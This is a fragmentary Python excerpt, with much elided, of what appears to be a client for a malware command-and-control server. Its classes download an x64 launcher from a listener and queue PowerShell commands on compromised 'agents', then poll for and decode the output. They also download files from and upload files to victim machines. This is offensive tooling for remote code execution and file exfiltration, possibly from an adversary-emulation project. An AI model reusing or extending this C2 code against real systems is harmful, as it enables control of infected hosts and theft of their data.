...
class MalwareGenericLauncher(LauncherType):
    ...
    async def download_launcher(self, dto: Dict[str, Any]) -> IO:
        try:
            ...
            target = "{}/listeners/{}/launcher/x64-{}".format(
                self._url, listener_id, platform
            )
...
class MalwareAgent(AgentType):
    ...
    async def shell_execute(self, dto: Dict[str, Any]) -> bytes:
        ...
        try:
            ...
            command_args = shlex.split(
                "powershell -Command '{}'".format(dto["command"])
            )
            interact_post_data = {
                "type": "command",
                "info": {"args": command_args, "timeout_ms": 5000},
            }
            response_dto = {}
            command_output_id = ""
            async with self._c2.get_session() as session:
            ...
            task_status_target = "{}/agents/{}/tasks/{}/result".format(
                self._url, dto["agent_internal_id"], command_output_id
            )
            for _ in range(40):
                async with self._c2.get_session() as session:
                    async with session.get(task_status_target) as response:
                        ...
                        for task_result in task_result_list:
                            ...
                            if output_encoded is not None:
                                ...
                                response_dto["content"] = base64.b64decode(
                                    output_encoded
                                ).decode("utf-8")
                                return response_dto
                        try:
    ...
    async def download_file(self, dto: Dict[str, Any]) -> bytes:
        try:
            ...
            interact_post_data = {
                "type": "file",
                "info": {"type": "get", "file_path": dto["file_path"]},
            }
    ...
    async def upload_file(self, dto: Dict[str, Any]) -> bytes:
        try:
            ...
            interact_post_data = {
                "type": "file",
                "info": {"type": "put", "file_path": file_path},
                "input": dto["file_content"],
            }
            logger.debug("target: %r, data: %r", target, interact_post_data)
